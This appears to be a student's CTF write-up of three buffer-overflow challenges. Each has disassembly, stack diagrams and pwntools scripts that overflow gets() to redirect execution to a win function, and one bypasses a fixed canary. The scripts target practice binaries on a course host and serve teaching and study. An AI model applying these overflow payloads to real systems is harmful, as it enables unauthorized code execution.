## jump

> gets exploit to get a bufferoverflow, and put win addr replace the lose addr

* local variable setting space

```
**00401225  4883ec50           sub     rsp, 0x50
00401229  488b05102e0000     mov     rax, qword [rel __TMC_END__]
00401230  be00000000         mov     esi, 0x0
00401235  4889c7             mov     rdi, rax
00401238  e863feffff         call    setbuf
```
* put lose addr to rax

```
0040123d  488d05bbffffff     lea     rax, [rel lose]
```

* move rax value which is lose addr to rsp+0x48 

```
00401244  4889442448         mov     qword [rsp+0x48 {var_18}], rax  {lose}
00401249  488d0586ffffff     lea     rax, [rel win]
00401250  4889c6             mov     rsi, rax  {win}
00401253  488d05f60d0000     lea     rax, [rel data_402050]
0040125a  4889c7             mov     rdi, rax  {data_402050, "The winning function is at %p\n"}
0040125d  b800000000         mov     eax, 0x0
00401262  e859feffff         call    printf
00401267  488d05020e0000     lea     rax, [rel data_402070]
0040126e  4889c7             mov     rdi, rax  {data_402070, "Do you remember how function poi…"}
00401271  e81afeffff         call    puts
00401276  4889e0             mov     rax, rsp {buf}
00401279  4889c7             mov     rdi, rax {buf}
0040127c  e84ffeffff         call    gets
00401281  488b442448         mov     rax, qword [rsp+0x48 {var_18}]
00401286  4889c6             mov     rsi, rax
00401289  488d050d0e0000     lea     rax, [rel data_40209d]
00401290  4889c7             mov     rdi, rax  {data_40209d, "Preparing to jump to %p\n"}
00401293  b800000000         mov     eax, 0x0
00401298  e823feffff         call    printf
0040129d  488b059c2d0000     mov     rax, qword [rel __TMC_END__]
004012a4  4889c7             mov     rdi, rax
004012a7  e834feffff         call    fflush
004012ac  488b442448         mov     rax, qword [rsp+0x48 {var_18}]
004012b1  ffd0               call    rax
004012b3  90                 nop     
004012b4  c9                 leave    {__saved_rbp}
004012b5  c3                 retn     {__return_addr}
```
* stack info

```
<-- Higher memory addresses
-------------------------
| return address         | 
-------------------------
| previous rbp           | <-- rbp
-------------------------
|    (Empty space)       |  <-- part of the 0x50 (80 bytes) allocated space
-------------------------
| address of lose        |  <-- rsp + 0x48 (inside the allocated 80 bytes)
|                        |  
-------------------------
|    (buffer space)  |  
|                        |
|                        |
-------------------------
[Bottom of stack]         <-- rsp (aligned, 0x50 bytes below rbp)

```

* pwn script

```
# so the payload should be 0x48 + win addr

from pwn import *
def interact_with_process(binary_path, host=None, port=None):
    # Start the process
    if host and port:
        p = remote(host, port)
    else:
        p = process(binary_path)

    prompt = p.recvuntil(b'Do you remember how function pointers work ?').decode('utf-8').strip()
    payload = "A"*72 + "\xd6\x11\x40\x00\x00\x00\x00\x00"
    p.sendline(str(payload))
    p.interactive()


# Example usage
interact_with_process('', '6447.lol', 24224)
# interact_with_process('../w1/too-slow')

```
## blind

> gets exploiting to get a bufferoverflow and replace the return addr

> remind below the return addr is the rbp, so need add extra 8bytes

* rbp-0x40 for buff

```
004011be  push    rbp {__saved_rbp}
004011bf  mov     rbp, rsp {__saved_rbp}
004011c2  sub     rsp, 0x40
004011c6  mov     rax, qword [rel __TMC_END__]
004011cd  mov     esi, 0x0
004011d2  mov     rdi, rax
004011d5  call    setbuf
004011da  lea     rax, [rel data_402010]
004011e1  mov     rdi, rax  {data_402010, "This is almost exactly the same …"}
004011e4  call    puts
004011e9  lea     rax, [rbp-0x40 {buf}]
004011ed  mov     rdi, rax {buf}
004011f0  call    gets
```
*  then return

```
004011f5  nop     
004011f6  leave    {__saved_rbp}
004011f7  retn     {__return_addr}

```
* stack info

```
[Top of stack]               <-- Higher memory addresses
-------------------------
| return address         |   <-- pushed by the caller of this function
-------------------------
| previous rbp           |   <-- saved by `push rbp`
-------------------------
|                        |  
|                        |  
|  (Empty space, 64 bytes) |   <-- 0x40 bytes for local variables
|                        |  
|                        |  
-------------------------
| buffer (buf)           |   <-- `rbp-0x40`, base of the 64-byte local variable space
-------------------------
[Bottom of stack]         <-- rsp (after the `sub rsp, 0x40`)

```
* payload

```
# the payload should be 0x40 + rbp (0x8bytes) => go to ret addr
from pwn import *
def interact_with_process(binary_path, host=None, port=None):
    # Start the process
    if host and port:
        p = remote(host, port)
    else:
        p = process(binary_path)

    p.recvuntil(b'This is almost exactly the same as jump...').decode('utf-8').strip()
    payload = b"A" * 72 + b"\x96\x11\x40\x00\x00\x00\x00\x00"  # Address in little-endian format
    print(f"[*] Sending payload: {payload}")
    p.sendline(payload)
    p.interactive()


# Example usage
interact_with_process('', '6447.lol', 18496)
# interact_with_process('../w1/too-slow')
```
## best-security
> exploit gets to get bufferoverflow
> bypass the canary inside buffer

* rbp -0x90 buffer 
* rbp -0x09 canary which is 12345678
* so payload would be (0x90-0x09)*A + "12345678" then bypass canary call winfun

```
004011ee  lea     rax, [rbp-0x9 {canary}]
004011f2  mov     rdx, 0x8373635343332313
004011fc  mov     qword [rax {canary}], rdx  {0x8373635343332313}
004011ff  lea     rax, [rbp-0x90 {user_input}]
00401206  mov     rdi, rax {user_input}
00401209  call    gets
0040120e  lea     rax, [rbp-0x9 {canary}]
00401212  mov     edx, 0x8
00401217  lea     rcx, [rel data_40202a]
0040121e  mov     rsi, rcx  {data_40202a, "12345678"}
00401221  mov     rdi, rax {canary}

```
* payload

```
from pwn import *
def interact_with_process(binary_path, host=None, port=None):
    # Start the process
    if host and port:
        p = remote(host, port)
    else:
        p = process(binary_path)

    p.recvuntil(b'AAAAw, yeah...').decode('utf-8').strip()
    payload = b"A" * 135
    canary = b"12345678"
    # padding = b"B" * 8
    payload += canary

    print(f"[*] Sending payload: {payload}")
    p.sendline(payload)
    p.interactive()


# Example usage
interact_with_process('', 'lol', 14860)

```